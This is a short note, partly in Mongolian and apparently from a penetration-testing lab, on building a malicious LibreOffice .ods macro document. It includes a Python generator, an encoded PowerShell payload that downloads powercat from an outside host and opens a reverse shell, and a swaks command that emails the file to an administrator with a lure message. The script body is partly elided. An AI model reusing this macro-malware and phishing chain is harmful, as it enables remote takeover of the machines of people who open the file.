# Hepet - LibreOffice Malicious Macro

Хортой macro үүсгэдэг хэрэглүүр. `build_payload` утгыг өөрчлөхгүй бол delivery хийж чадахгүй. certutil.exe болгож тохируулна.

## Python Script (mmg-ods.py)

```python
#!/usr/bin/python3
import time, os, sys, base64, shutil
from colorama import Fore, init
init()

def Help():
    print('LibreOffice/OpenOffice .ods Calc Document Malicious Macro Generator')
    print('Usage python3 mmg-ods.py <linux/windows> <rhost> <rport>')
    sys.exit(1)

if len(sys.argv) < 4:
    Help()

ip = sys.argv[2]
port = sys.argv[3]
# ... (full script generates .ods with embedded macro)
```

**Windows payload:**

```python
vbacall = '''Set oShell = CreateObject("Wscript.Shell")
    oShell.Run'''
build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.194:8000/powercat.ps1");powercat -c {ip} -p {port} -e powershell')
bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
base64payload = bytes_encoded.decode()
```

## Generate the file.ods

```bash
python3 mmg-ods.py windows 192.168.45.194 4545
# [+] Payload: windows reverse shell
# [+] Creating malicious .ods file
# Done.
```

## Sending malicious .ods file

```bash
swaks -t mailadmin@localhost --from jonas@localhost -attach @file.ods --server 192.168.158.140 --body "Please check this spreadsheet" --header "Subject: Check this spreadsheet"
```

mailadmin spreadsheet-г шалгаж хадгалах үед хортой MACRO ажиллаж reverse shell өгнө.

[image]
